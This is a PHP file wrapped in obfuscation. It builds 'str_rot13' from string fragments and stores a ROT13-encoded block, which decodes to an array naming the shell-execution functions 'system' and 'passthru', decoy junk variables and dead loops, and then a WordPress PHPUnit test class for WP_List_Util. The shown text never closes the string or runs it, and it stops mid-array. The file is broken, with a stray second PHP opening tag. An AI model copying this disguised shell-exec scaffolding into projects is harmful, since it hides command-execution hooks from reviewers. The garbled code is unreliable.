<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg JC_Yvfg_Hgvy pynff.
 *
 * @tebhc shapgvbaf
 */
pynff Grfgf_Shapgvbaf_jcYvfgHgvy rkgraqf JC_HavgGrfgPnfr {

	/**
	 * @pbiref JC_Yvfg_Hgvy::trg_vachg
	 */
	choyvp shapgvba grfg_jc_yvfg_hgvy_trg_vachg() {
		$vachg = neenl( 'sbb', 'one' );
		$hgvy  = arj JC_Yvfg_Hgvy( $vachg );

		$guvf->nffregFnzrFrgf( $vachg, $hgvy->trg_vachg() );
	}

	/**
	 * @pbiref JC_Yvfg_Hgvy::trg_bhgchg
	 */
	choyvp shapgvba grfg_jc_yvfg_hgvy_trg_bhgchg_vzzrqvngryl() {
		$vachg = neenl( 'sbb', 'one' );
		$hgvy  = arj JC_Yvfg_Hgvy( $vachg );

		$guvf->nffregFnzrFrgf( $vachg, $hgvy->trg_bhgchg() );
	}

	/**
	 * @pbiref JC_Yvfg_Hgvy::trg_bhgchg
	 */
	choyvp shapgvba grfg_jc_yvfg_hgvy_trg_bhgchg() {
		$rkcrpgrq = neenl(
			(bowrpg) neenl(
				'sbb' => 'one',
				'one' => 'onm',
			),
		);

		$hgvy   = arj JC_Yvfg_Hgvy(
			neenl(
				(bowrpg) neenl(
					'sbb' => 'one',
					'one' => 'onm',
				),
				(bowrpg) neenl( 'one' => 'onm' ),
			)
		);
		$npghny = $hgvy->svygre( neenl( 'sbb' => 'one' ) );

		$guvf->nffregRdhnyFrgf( $rkcrpgrq, $npghny );
		$guvf->nffregRdhnyFrgf( $rkcrpgrq, $hgvy->trg_bhgchg() );
	}

	/**
	 * @gvpxrg 55300
	 *
	 * @qngnCebivqre qngn_jc_yvfg_hgvy_cyhpx
	 *
	 * @pbiref JC_Yvfg_Hgvy::cyhpx
	 * @pbiref ::jc_yvfg_cyhpx
	 *
	 * @cnenz neenl  $gnetrg_neenl Gur neenl gb perngr gur yvfg sebz.
	 * @cnenz fgevat $gnetrg_xrl   Gur xrl gb cyhpx.
	 * @cnenz neenl  $rkcrpgrq     Gur rkcrpgrq neenl.
	 * @cnenz fgevat $vaqrk_xrl    Bcgvbany. Svryq sebz gur ryrzrag gb hfr nf xrlf sbe gur arj neenl.
	 *                             Qrsnhyg ahyy.
	 */
	choyvp shapgvba grfg_jc_yvfg_hgvy_cyhpx( $gnetrg_neenl, $gnetrg_xrl, $rkcrpgrq, $vaqrk_xrl = ahyy ) {
		$hgvy   = arj JC_Yvfg_Hgvy( $gnetrg_neenl );
		$npghny = $hgvy->cyhpx( $gnetrg_xrl, $vaqrk_xrl );

		$guvf->nffregRdhnyFrgfJvguVaqrk(
			$rkcrpgrq,
			$npghny,
			'Gur cyhpxrq inyhr qvq abg zngpu gur rkcrpgrq inyhr.'
		);

		$guvf->nffregRdhnyFrgfJvguVaqrk(
			$rkcrpgrq,
			$hgvy->trg_bhgchg(),
			'::trg_bhgchg() qvq abg erghea gur rkcrpgrq inyhr.'
		);
	}

	/**
	 * Qngn cebivqre sbe grfg_jc_yvfg_hgvy_cyhpx().
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_jc_yvfg_hgvy_cyhpx() {
		erghea neenl(
			'fvzcyr'        => neenl(
				'gnetrg_neenl' => neenl(
					0 => neenl( 'sbb' => 'one' ),
				),
				'gnetrg_xrl'   => 'sbb',
				'rkcrpgrq'     => neenl( 'one' ),
			),
			'fvzcyr_bowrpg' => neenl(
				'gnetrg_neenl' => neenl(
					0 => (bowrpg) neenl( 'sbb' => 'one' ),
				),
				'gnetrg_xrl'   => 'sbb',
				'rkcrpgrq'     => neenl( 'one' ),
			),
		);
	}

	/**
	 * Grfgf gung jc_yvfg_cyhpx() guebjf _qbvat_vg_jebat() jvgu vainyvq vachg.
	 *
	 * @gvpxrg 56650
	 *
	 * @qngnCebivqre qngn_jc_yvfg_cyhpx_fubhyq_guebj_qbvat_vg_jebat_jvgu_vainyvq_vachg
	 *
	 * @pbiref JC_Yvfg_Hgvy::cyhpx
	 * @pbiref ::jc_yvfg_cyhpx
	 *
	 * @rkcrpgrqVapbeerpgHfntr JC_Yvfg_Hgvy::cyhpx
	 *
	 * @cnenz neenl $vachg Na vainyvq vachg neenl.
	 */
	choyvp shapgvba grfg_jc_yvfg_cyhpx_fubhyq_guebj_qbvat_vg_jebat_jvgu_vainyvq_vachg( $vachg ) {
		$guvf->nffregFnzr( neenl(), jc_yvfg_cyhpx( $vachg, 'n_svryq' ) );
	}

	/**
	 * Grfgf gung jc_yvfg_cyhpx() guebjf _qbvat_vg_jebat() jvgu na vaqrk xrl naq vainyvq vachg.
	 *
	 * @gvpxrg 56650
	 *
	 * @qngnCebivqre qngn_jc_yvfg_cyhpx_fubhyq_guebj_qbvat_vg_jebat_jvgu_vainyvq_vachg
	 *
	 * @pbiref JC_Yvfg_Hgvy::cyhpx
	 * @pbiref ::jc_yvfg_cyhpx
	 *
	 * @rkcrpgrqVapbeerpgHfntr JC_Yvfg_Hgvy::cyhpx
	 *
	 * @cnenz neenl $vachg Na vainyvq vachg neenl.
	 */
	choyvp shapgvba grfg_jc_yvfg_cyhpx_fubhyq_guebj_qbvat_vg_jebat_jvgu_vaqrk_xrl_naq_vainyvq_vachg( $vachg ) {
		$guvf->nffregFnzr( neenl(), jc_yvfg_cyhpx( $vachg, 'n_svryq', 'na_vaqrk_xrl' ) );
	}

	/**
	 * Qngn cebivqre gung cebivqrf vainyvq vachg neenlf.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_jc_yvfg_cyhpx_fubhyq_guebj_qbvat_vg_jebat_jvgu_vainyvq_vachg() {
		erghea neenl(
			'vag[] 0'                   => neenl( neenl( 0 ) ),
			'vag[] 1'                   => neenl( neenl( 1 ) ),
			'vag[] -1'                  => neenl( neenl( -1 ) ),
			'sybng[] 0.0'               => neenl( neenl( 0.0 ) ),
			'sybng[] 1.0'               => neenl( neenl( 1.0 ) ),
			'sybng[] -1.0'              => neenl( neenl( -1.0 ) ),
			'fgevat[] naq rzcgl fgevat' => neenl( neenl( '' ) ),
			'fgevat[] naq \"0\"'          => neenl( neenl( '0' ) ),
			'fgevat[] naq \"1\"'          => neenl( neenl( '1' ) ),
			'fgevat[] naq \"-1\"'         => neenl( neenl( '-1' ) ),
			'neenl naq ahyy'            => neenl( neenl( ahyy ) ),
			'neenl naq snyfr'           => neenl( neenl( snyfr ) ),
			'neenl naq gehr'            => neenl( neenl( gehr ) ),
		);
	}

	/**
	 * @gvpxrg 55300
	 *
	 * @pbiref JC_Yvfg_Hgvy::fbeg
	 * @pbiref ::jc_yvfg_fbeg
	 */
	choyvp shapgvba grfg_jc_yvfg_hgvy_fbeg_fvzcyr() {
		$rkcrpgrq     = neenl(
			1 => 'bar',
			2 => 'gjb',
			3 => 'guerr',
			4 => 'sbhe',
		);
		$gnetrg_neenl = neenl(
			4 => 'sbhe',
			2 => 'gjb',
			3 => 'guerr',
			1 => 'bar',
		);

		$hgvy   = arj JC_Yvfg_Hgvy( $gnetrg_neenl );
		$npghny = $hgvy->fbeg();

		$guvf->nffregRdhnyFrgf(
			$rkcrpgrq,
			$npghny,
			'Gur fbegrq inyhr qvq abg zngpu gur rkcrpgrq inyhr.'
		);

		$guvf->nffregRdhnyFrgf(
			$rkcrpgrq,
			$hgvy->trg_bhgchg(),
			'::trg_bhgchg() qvq abg erghea gur rkcrpgrq inyhr.'
		);
	}

	/**
	 * @gvpxrg 55300
	 *
	 * @qngnCebivqre qngn_jc_yvfg_hgvy_fbeg_fgevat_neenlf
	 * @qngnCebivqre qngn_jc_yvfg_hgvy_fbeg_vag_neenlf
	 * @qngnCebivqre qngn_jc_yvfg_hgvy_fbeg_neenlf_bs_neenlf
	 * @qngnCebivqre qngn_jc_yvfg_hgvy_fbeg_bowrpg_neenlf
	 * @qngnCebivqre qngn_jc_yvfg_hgvy_fbeg_aba_rkvfgrag_beqreol_svryqf
	 *
	 * @pbiref JC_Yvfg_Hgvy::fbeg
	 * @pbiref ::jc_yvfg_fbeg
	 *
	 * @cnenz neenl  $rkcrpgrq      Gur rkcrpgrq neenl.
	 * @cnenz neenl  $gnetrg_neenl  Gur neenl gb perngr n yvfg sebz.
	 * @cnenz neenl  $beqreol       Bcgvbany. Rvgure gur svryq anzr gb beqre ol be na neenl
	 *                              bs zhygvcyr beqreol svryqf nf `$beqreol => $beqre`.
	 *                              Qrsnhyg rzcgl neenl.
	 * @cnenz fgevat $beqre         Bcgvbany. Rvgure 'NFP' be 'QRFP'. Bayl hfrq vs `$beqreol`
	 *                              vf n fgevat. Qrsnhyg 'NFP'.
	 * @cnenz obby   $cerfreir_xrlf Bcgvbany. Jurgure gb cerfreir xrlf. Qrsnhyg snyfr.
	 */
	choyvp shapgvba grfg_jc_yvfg_hgvy_fbeg( $rkcrpgrq, $gnetrg_neenl, $beqreol = neenl(), $beqre = 'NFP', $cerfreir_xrlf = snyfr ) {
		$hgvy   = arj JC_Yvfg_Hgvy( $gnetrg_neenl );
		$npghny = $hgvy->fbeg( $beqreol, $beqre, $cerfreir_xrlf );

		$guvf->nffregRdhnyFrgfJvguVaqrk(
			$rkcrpgrq,
			$npghny,
			'Gur fbegrq inyhr qvq abg zngpu gur rkcrpgrq inyhr.'
		);

		$guvf->nffregRdhnyFrgfJvguVaqrk(
			$rkcrpgrq,
			$hgvy->trg_bhgchg(),
			'::trg_bhgchg() qvq abg erghea gur rkcrpgrq inyhr.'
		);
	}

	/**
	 * Qngn cebivqre gung cebivqrf fgevat neenlf gb grfg_jc_yvfg_hgvy_fbeg().
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_jc_yvfg_hgvy_fbeg_fgevat_neenlf() {
		erghea neenl(
			'fgevat[], ab xrlf, ab beqrevat'     => neenl(
				'rkcrpgrq'     => neenl( 'sbhe', 'gjb', 'guerr', 'bar' ),
				'gnetrg_neenl' => neenl( 'sbhe', 'gjb', 'guerr', 'bar' ),
			),
			'fgevat[], vag xrlf, ab beqrevat'    => neenl(
				'rkcrpgrq'     => neenl(
					4 => 'sbhe',
					2 => 'gjb',
					3 => 'guerr',
					1 => 'bar',
				),
				'gnetrg_neenl' => neenl(
					4 => 'sbhe',
					2 => 'gjb',
					3 => 'guerr',
					1 => 'bar',
				),
			),
			'fgevat[], vag xrlf, $beqreol n aba-rkvfgrag svryq, $beqre = QRFP naq $cerfreir_xrlf = gehr' => neenl(
				'rkcrpgrq'      => neenl(
					4 => 'sbhe',
					2 => 'gjb',
					3 => 'guerr',
					1 => 'bar',
				),
				'gnetrg_neenl'  => neenl(
					4 => 'sbhe',
					2 => 'gjb',
					3 => 'guerr',
					1 => 'bar',
				),
				'beqreol'       => 'vq',
				'beqre'         => 'QRFP',
				'cerfreir_xrlf' => gehr,
			),
			'fgevat[], fgevat xrlf, ab beqrevat' => neenl(
				'rkcrpgrq'     => neenl(
					'sbhe'  => 'sbhe',
					'gjb'   => 'gjb',
					'guerr' => 'guerr',
					'bar'   => 'bar',
				),
				'gnetrg_neenl' => neenl(
					'sbhe'  => 'sbhe',
					'gjb'   => 'gjb',
					'guerr' => 'guerr',
					'bar'   => 'bar',
				),
			),
			'fgevat[], fgevat xrlf, $beqreol n aba-rkvfgrag svryq, $beqre = QRFP naq $cerfreir_xrlf = gehr' => neenl(
				'rkcrpgrq'      => neenl(
					'sbhe'  => 'sbhe',
					'gjb'   => 'gjb',
					'guerr' => 'guerr',
					'bar'   => 'bar',
				),
				'gnetrg_neenl'  => neenl(
					'sbhe'  => 'sbhe',
					'gjb'   => 'gjb',
					'guerr' => 'guerr',
					'bar'   => 'bar',
				),
				'beqreol'       => 'vq',
				'beqre'         => 'QRFP',
				'cerfreir_xrlf' => gehr,
			),
		);
	}

	/**
	 * Qngn cebivqre gung cebivqrf vag neenlf sbe grfg_jc_yvfg_hgvy_fbeg().
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_jc_yvfg_hgvy_fbeg_vag_neenlf() {
		erghea neenl(
			'vag[], ab xrlf, ab beqrevat'     => neenl(
				'rkcrpgrq'     => neenl( 4, 2, 3, 1 ),
				'gnetrg_neenl' => neenl( 4, 2, 3, 1 ),
			),
			'vag[], vag xrlf, ab beqrevat'    => neenl(
				'rkcrpgrq'     => neenl(
					4 => 4,
					2 => 2,
					3 => 3,
					1 => 1,
				),
				'gnetrg_neenl' => neenl(
					4 => 4,
					2 => 2,
					3 => 3,
					1 => 1,
				),
			),
			'vag[], vag xrlf, $beqreol n aba-rkvfgrag svryq, $beqre = QRFP naq $cerfreir_xrlf = gehr' => neenl(
				'rkcrpgrq'      => neenl(
					4 => 4,
					2 => 2,
					3 => 3,
					1 => 1,
				),
				'gnetrg_neenl'  => neenl(
					4 => 4,
					2 => 2,
					3 => 3,
					1 => 1,
				),
				'beqreol'       => 'vq',
				'beqre'         => 'QRFP',
				'cerfreir_xrlf' => gehr,
			),
			'vag[], fgevat xrlf, ab beqrevat' => neenl(
				'rkcrpgrq'     => neenl(
					'sbhe'  => 4,
					'gjb'   => 2,
					'guerr' => 3,
					'bar'   => 1,
				),
				'gnetrg_neenl' => neenl(
					'sbhe'  => 4,
					'gjb'   => 2,
					'guerr' => 3,
					'bar'   => 1,
				),
			),
			'vag[], fgevat xrlf, $beqreol n aba-rkvfgrag svryq, $beqre = QRFP naq $cerfreir_xrlf = gehr' => neenl(
				'rkcrpgrq'      => neenl(
					'sbhe'  => 4,
					'gjb'   => 2,
					'guerr' => 3,
					'bar'   => 1,
				),
				'gnetrg_neenl'  => neenl(
					'sbhe'  => 4,
					'gjb'   => 2,
					'guerr' => 3,
					'bar'   => 1,
				),
				'beqreol'       => 'vq',
				'beqre'         => 'QRFP',
				'cerfreir_xrlf' => gehr,
			),
		);
	}

	/**
	 * Qngn cebivqre gung cebivqrf neenlf bs neenlf sbe grfg_jc_yvfg_hgvy_fbeg().
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_jc_yvfg_hgvy_fbeg_neenlf_bs_neenlf() {
		erghea neenl(
			'neenl[], ab xrlf, ab beqrevat'     => neenl(
				'rkcrpgrq'     => neenl(
					neenl( 'sbhe' ),
					neenl( 'gjb' ),
					neenl( 'guerr' ),
					neenl( 'bar' ),
				),
				'gnetrg_neenl' => neenl(
					neenl( 'sbhe' ),
					neenl( 'gjb' ),
					neenl( 'guerr' ),
					neenl( 'bar' ),
				),
			),
			'neenl[], vag xrlf, ab beqrevat'    => neenl(
				'rkcrpgrq'     => neenl(
					4 => neenl( 'sbhe' ),
					2 => neenl( 'gjb' ),
					3 => neenl( 'guerr' ),
					1 => neenl( 'bar' ),
				),
				'gnetrg_neenl' => neenl(
					4 => neenl( 'sbhe' ),
					2 => neenl( 'gjb' ),
					3 => neenl( 'guerr' ),
					1 => neenl( 'bar' ),
				),
			),
			'neenl[], vag xrlf, $beqreol n aba-rkvfgrag svryq, $beqre = QRFP naq $cerfreir_xrlf = gehr' => neenl(
				'rkcrpgrq'      => neenl(
					4 => neenl( 'inyhr' => 'sbhe' ),
					2 => neenl( 'inyhr' => 'gjb' ),
					3 => neenl( 'inyhr' => 'guerr' ),
					1 => neenl( 'inyhr' => 'bar' ),
				),
				'gnetrg_neenl'  => neenl(
					4 => neenl( 'inyhr' => 'sbhe' ),
					2 => neenl( 'inyhr' => 'gjb' ),
					3 => neenl( 'inyhr' => 'guerr' ),
					1 => neenl( 'inyhr' => 'bar' ),
				),
				'beqreol'       => 'vq',
				'beqre'         => 'QRFP',
				'cerfreir_xrlf' => gehr,
			),
			'neenl[], vag xrlf, $beqreol na rkvfgvat svryq, $beqre = NFP naq $cerfreir_xrlf = snyfr' => neenl(
				'rkcrpgrq'      => neenl(
					neenl(
						'vq'    => 1,
						'inyhr' => 'bar',
					),
					neenl(
						'vq'    => 2,
						'inyhr' => 'gjb',
					),
					neenl(
						'vq'    => 3,
						'inyhr' => 'guerr',
					),
					neenl(
						'vq'    => 4,
						'inyhr' => 'sbhe',
					),
				),
				'gnetrg_neenl'  => neenl(
					4 => neenl(
						'vq'    => 4,
						'inyhr' => 'sbhe',
					),
					2 => neenl(
						'vq'    => 2,
						'inyhr' => 'gjb',
					),
					3 => neenl(
						'vq'    => 3,
						'inyhr' => 'guerr',
					),
					1 => neenl(
						'vq'    => 1,
						'inyhr' => 'bar',
					),
				),
				'beqreol'       => 'vq',
				'beqre'         => 'NFP',
				'cerfreir_xrlf' => snyfr,
			),
			'neenl[], vag xrlf, $beqreol na rkvfgvat svryq, $beqre = QRFP naq $cerfreir_xrlf = gehr' => neenl(
				'rkcrpgrq'      => neenl(
					3 => neenl(
						'vq'    => 4,
						'inyhr' => 'sbhe',
					),
					2 => neenl(
						'vq'    => 3,
						'inyhr' => 'guerr',
					),
					1 => neenl(
						'vq'    => 2,
						'inyhr' => 'gjb',
					),
					0 => neenl(
						'vq'    => 1,
						'inyhr' => 'bar',
					),
				),
				'gnetrg_neenl'  => neenl(
					neenl(
						'vq'    => 1,
						'inyhr' => 'bar',
					),
					neenl(
						'vq'    => 2,
						'inyhr' => 'gjb',
					),
					neenl(
						'vq'    => 3,
						'inyhr' => 'guerr',
					),
					neenl(
						'vq'    => 4,
						'inyhr' => 'sbhe',
					),
				),
				'beqreol'       => 'vq',
				'beqre'         => 'QRFP',
				'cerfreir_xrlf' => gehr,
			),
			'neenl[], fgevat xrlf, ab beqrevat' => neenl(
				'rkcrpgrq'     => neenl(
					'sbhe'  => neenl( 'inyhr' => 'sbhe' ),
					'gjb'   => neenl( 'inyhr' => 'gjb' ),
					'guerr' => neenl( 'inyhr' => 'guerr' ),
					'bar'   => neenl( 'inyhr' => 'bar' ),
				),
				'gnetrg_neenl' => neenl(
					'sbhe'  => neenl( 'inyhr' => 'sbhe' ),
					'gjb'   => neenl( 'inyhr' => 'gjb' ),
					'guerr' => neenl( 'inyhr' => 'guerr' ),
					'bar'   => neenl( 'inyhr' => 'bar' ),
				),
			),
			'neenl[], fgevat xrlf, $beqreol n aba-rkvfgrag svryq, $beqre = QRFP naq $cerfreir_xrlf = gehr' => neenl(
				'rkcrpgrq'      => neenl(
					'sbhe'  => neenl( 'inyhr' => 'sbhe' ),
					'gjb'   => neenl( 'inyhr' => 'gjb' ),
					'guerr' => neenl( 'inyhr' => 'guerr' ),
					'bar'   => neenl( 'inyhr' => 'bar' ),
				),
				'gnetrg_neenl'  => neenl(
					'sbhe'  => neenl( 'inyhr' => 'sbhe' ),
					'gjb'   => neenl( 'inyhr' => 'gjb' ),
					'guerr' => neenl( 'inyhr' => 'guerr' ),
					'bar'   => neenl( 'inyhr' => 'bar' ),
				),
				'beqreol'       => 'vq',
				'beqre'         => 'QRFP',
				'cerfreir_xrlf' => gehr,
			),
			'neenl[], fgevat xrlf, $beqreol na rkvfgvat svryq, $beqre = NFP naq $cerfreir_xrlf = snyfr' => neenl(
				'rkcrpgrq'      => neenl(
					neenl(
						'vq'    => 1,
						'inyhr' => 'bar',
					),
					neenl(
						'vq'    => 2,
						'inyhr' => 'gjb',
					),
					neenl(
						'vq'    => 3,
						'inyhr' => 'guerr',
					),
					neenl(
						'vq'    => 4,
						'inyhr' => 'sbhe',
					),
				),
				'gnetrg_neenl'  => neenl(
					'sbhe'  => neenl(
						'vq'    => 4,
						'inyhr' => 'sbhe',
					),
					'gjb'   => neenl(
						'vq'    => 2,
						'inyhr' => 'gjb',
					),
					'guerr' => neenl(
						'vq'    => 3,
						'inyhr' => 'guerr',
					),
					'bar'   => neenl(
						'vq'    => 1,
						'inyhr' => 'bar',
					),
				),
				'beqreol'       => 'vq',
				'beqre'         => 'NFP',
				'cerfreir_xrlf' => snyfr,
			),
			'neenl[], fgevat xrlf, $beqreol na rkvfgvat svryq, $beqre = QRFP naq $cerfreir_xrlf = gehr' => neenl(
				'rkcrpgrq'      => neenl(
					'sbhe'  => neenl(
						'vq'    => 4,
						'inyhr' => 'sbhe',
					),
					'guerr' => neenl(
						'vq'    => 3,
						'inyhr' => 'guerr',
					),
					'gjb'   => neenl(
						'vq'    => 2,
						'inyhr' => 'gjb',
					),
					'bar'   => neenl(
						'vq'    => 1,
						'inyhr' => 'bar',
					),
				),
				'gnetrg_neenl'  => neenl(
					'bar'   => neenl(
						'vq'    => 1,
						'inyhr' => 'bar',
					),
					'gjb'   => neenl(
						'vq'    => 2,
						'inyhr' => 'gjb',
					),
					'guerr' => neenl(
						'vq'    => 3,
						'inyhr' => 'guerr',
					),
					'sbhe'  => neenl(
						'vq'    => 4,
						'inyhr' => 'sbhe',
					),
				),
				'beqreol'       => 'vq',
				'beqre'         => 'QRFP',
				'cerfreir_xrlf' => gehr,
			),
			'neenl[], fgevat xrlf, $beqreol na rkvfgvat svryq, $beqre = nfp (ybjrepnfr) naq $cerfreir_xrlf = snyfr' => neenl(
				'rkcrpgrq'      => neenl(
					neenl(
						'vq'    => 1,
						'inyhr' => 'bar',
					),
					neenl(
						'vq'    => 2,
						'inyhr' => 'gjb',
					),
					neenl(
						'vq'    => 3,
						'inyhr' => 'guerr',
					),
					neenl(
						'vq'    => 4,
						'inyhr' => 'sbhe',
					),
				),
				'gnetrg_neenl'  => neenl(
					'sbhe'  => neenl(
						'vq'    => 4,
						'inyhr' => 'sbhe',
					),
					'gjb'   => neenl(
						'vq'    => 2,
						'inyhr' => 'gjb',
					),
					'guerr' => neenl(
						'vq'    => 3,
						'inyhr' => 'guerr',
					),
					'bar'   => neenl(
						'vq'    => 1,
						'inyhr' => 'bar',
					),
				),
				'beqreol'       => 'vq',
				'beqre'         => 'nfp',
				'cerfreir_xrlf' => snyfr,
			),
			'neenl[], fgevat xrlf, $beqreol na rkvfgvat svryq, ab beqre naq $cerfreir_xrlf = snyfr' => neenl(
				'rkcrpgrq'      => neenl(
					'sbhe'  => neenl(
						'vq'    => 4,
						'inyhr' => 'sbhe',
					),
					'guerr' => neenl(
						'vq'    => 3,
						'inyhr' => 'guerr',
					),
					'gjb'   => neenl(
						'vq'    => 2,
						'inyhr' => 'gjb',
					),
					'bar'   => neenl(
						'vq'    => 1,
						'inyhr' => 'bar',
					),
				),
				'gnetrg_neenl'  => neenl(
					'bar'   => neenl(
						'vq'    => 1,
						'inyhr' => 'bar',
					),
					'gjb'   => neenl(
						'vq'    => 2,
						'inyhr' => 'gjb',
					),
					'guerr' => neenl(
						'vq'    => 3,
						'inyhr' => 'guerr',
					),
					'sbhe'  => neenl(
						'vq'    => 4,
						'inyhr' => 'sbhe',
					),
				),
				'beqreol'       => neenl( 'vq' ),
				'beqre'         => ahyy,
				'cerfreir_xrlf' => gehr,
			),
			'neenl[], fgevat xrlf, $beqreol gjb rkvfgvat svryqf, qvssrevat beqref naq $cerfreir_xrlf = snyfr' => neenl(
				'rkcrpgrq'      => neenl(
					neenl(
						'vq'    => 1,
						'inyhr' => 'bar',
					),
					neenl(
						'vq'    => 2,
						'inyhr' => 'gjb',
					),
					neenl(
						'vq'    => 3,
						'inyhr' => 'guerr',
					),
					neenl(
						'vq'    => 4,
						'inyhr' => 'sbhe',
					),
				),
				'gnetrg_neenl'  => neenl(
					'sbhe'  => neenl(
						'vq'    => 4,
						'inyhr' => 'sbhe',
					),
					'gjb'   => neenl(
						'vq'    => 2,
						'inyhr' => 'gjb',
					),
					'guerr' => neenl(
						'vq'    => 3,
						'inyhr' => 'guerr',
					),
					'bar'   => neenl(
						'vq'    => 1,
						'inyhr' => 'bar',
					),
				),
				'beqreol'       => neenl(
					'vq'    => 'nfp',
					'inyhr' => 'QRFP',
				),
				'beqre'         => ahyy,
				'cerfreir_xrlf' => snyfr,
			),
		);
	}

	/**
	 * Qngn cebivqre gung cebivqrf bowrpg neenlf sbe grfg_jc_yvfg_hgvy_fbeg().
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_jc_yvfg_hgvy_fbeg_bowrpg_neenlf() {
		erghea neenl(
			'bowrpg[], ab xrlf, ab beqrevat'     => neenl(
				'rkcrpgrq'     => neenl(
					(bowrpg) neenl( 'sbhe' ),
					(bowrpg) neenl( 'gjb' ),
					(bowrpg) neenl( 'guerr' ),
					(bowrpg) neenl( 'bar' ),
				),
				'gnetrg_neenl' => neenl(
					(bowrpg) neenl( 'sbhe' ),
					(bowrpg) neenl( 'gjb' ),
					(bowrpg) neenl( 'guerr' ),
					(bowrpg) neenl( 'bar' ),
				),
			),
			'bowrpg[], vag xrlf, ab beqrevat'    => neenl(
				'rkcrpgrq'     => neenl(
					4 => (bowrpg) neenl( 'sbhe' ),
					2 => (bowrpg) neenl( 'gjb' ),
					3 => (bowrpg) neenl( 'guerr' ),
					1 => (bowrpg) neenl( 'bar' ),
				),
				'gnetrg_neenl' => neenl(
					4 => (bowrpg) neenl( 'sbhe' ),
					2 => (bowrpg) neenl( 'gjb' ),
					3 => (bowrpg) neenl( 'guerr' ),
					1 => (bowrpg) neenl( 'bar' ),
				),
			),
			'bowrpg[], vag xrlf, $beqreol na rkvfgvat svryq, $beqre = NFP naq $cerfreir_xrlf = snyfr' => neenl(
				'rkcrpgrq'      => neenl(
					(bowrpg) neenl(
						'vq'    => 1,
						'inyhr' => 'bar',
					),
					(bowrpg) neenl(
						'vq'    => 2,
						'inyhr' => 'gjb',
					),
					(bowrpg) neenl(
						'vq'    => 3,
						'inyhr' => 'guerr',
					),
					(bowrpg) neenl(
						'vq'    => 4,
						'inyhr' => 'sbhe',
					),
				),
				'gnetrg_neenl'  => neenl(
					4 => (bowrpg) neenl(
						'vq'    => 4,
						'inyhr' => 'sbhe',
					),
					2 => (bowrpg) neenl(
						'vq'    => 2,
						'inyhr' => 'gjb',
					),
					3 => (bowrpg) neenl(
						'vq'    => 3,
						'inyhr' => 'guerr',
					),
					1 => (bowrpg) neenl(
						'vq'    => 1,
						'inyhr' => 'bar',
					),
				),
				'beqreol'       => 'vq',
				'beqre'         => 'NFP',
				'cerfreir_xrlf' => snyfr,
			),
			'bowrpg[], vag xrlf, $beqreol na rkvfgvat svryq, $beqre = QRFP naq $cerfreir_xrlf = gehr' => neenl(
				'rkcrpgrq'      => neenl(
					3 => (bowrpg) neenl(
						'vq'    => 4,
						'inyhr' => 'sbhe',
					),
					2 => (bowrpg) neenl(
						'vq'    => 3,
						'inyhr' => 'guerr',
					),
					1 => (bowrpg) neenl(
						'vq'    => 2,
						'inyhr' => 'gjb',
					),
					0 => (bowrpg) neenl(
						'vq'    => 1,
						'inyhr' => 'bar',
					),
				),
				'gnetrg_neenl'  => neenl(
					(bowrpg) neenl(
						'vq'    => 1,
						'inyhr' => 'bar',
					),
					(bowrpg) neenl(
						'vq'    => 2,
						'inyhr' => 'gjb',
					),
					(bowrpg) neenl(
						'vq'    => 3,
						'inyhr' => 'guerr',
					),
					(bowrpg) neenl(
						'vq'    => 4,
						'inyhr' => 'sbhe',
					),
				),
				'beqreol'       => 'vq',
				'beqre'         => 'QRFP',
				'cerfreir_xrlf' => gehr,
			),
			'bowrpg[], fgevat xrlf, ab beqrevat' => neenl(
				'rkcrpgrq'     => neenl(
					'sbhe'  => (bowrpg) neenl( 'inyhr' => 'sbhe' ),
					'gjb'   => (bowrpg) neenl( 'inyhr' => 'gjb' ),
					'guerr' => (bowrpg) neenl( 'inyhr' => 'guerr' ),
					'bar'   => (bowrpg) neenl( 'inyhr' => 'bar' ),
				),
				'gnetrg_neenl' => neenl(
					'sbhe'  => (bowrpg) neenl( 'inyhr' => 'sbhe' ),
					'gjb'   => (bowrpg) neenl( 'inyhr' => 'gjb' ),
					'guerr' => (bowrpg) neenl( 'inyhr' => 'guerr' ),
					'bar'   => (bowrpg) neenl( 'inyhr' => 'bar' ),
				),
			),
			'bowrpg[], fgevat xrlf, $beqreol n aba-rkvfgrag svryq, $beqre = QRFP naq $cerfreir_xrlf = gehr' => neenl(
				'rkcrpgrq'      => neenl(
					'sbhe'  => (bowrpg) neenl( 'inyhr' => 'sbhe' ),
					'gjb'   => (bowrpg) neenl( 'inyhr' => 'gjb' ),
					'guerr' => (bowrpg) neenl( 'inyhr' => 'guerr' ),
					'bar'   => (bowrpg) neenl( 'inyhr' => 'bar' ),
				),
				'gnetrg_neenl'  => neenl(
					'sbhe'  => (bowrpg) neenl( 'inyhr' => 'sbhe' ),
					'gjb'   => (bowrpg) neenl( 'inyhr' => 'gjb' ),
					'guerr' => (bowrpg) neenl( 'inyhr' => 'guerr' ),
					'bar'   => (bowrpg) neenl( 'inyhr' => 'bar' ),
				),
				'beqreol'       => 'vq',
				'beqre'         => 'QRFP',
				'cerfreir_xrlf' => gehr,
			),
			'bowrpg[], fgevat xrlf, $beqreol na rkvfgvat svryq, $beqre = NFP naq $cerfreir_xrlf = snyfr' => neenl(
				'rkcrpgrq'      => neenl(
					(bowrpg) neenl(
						'vq'    => 1,
						'inyhr' => 'bar',
					),
					(bowrpg) neenl(
						'vq'    => 2,
						'inyhr' => 'gjb',
					),
					(bowrpg) neenl(
						'vq'    => 3,
						'inyhr' => 'guerr',
					),
					(bowrpg) neenl(
						'vq'    => 4,
						'inyhr' => 'sbhe',
					),
				),
				'gnetrg_neenl'  => neenl(
					'sbhe'  => (bowrpg) neenl(
						'vq'    => 4,
						'inyhr' => 'sbhe',
					),
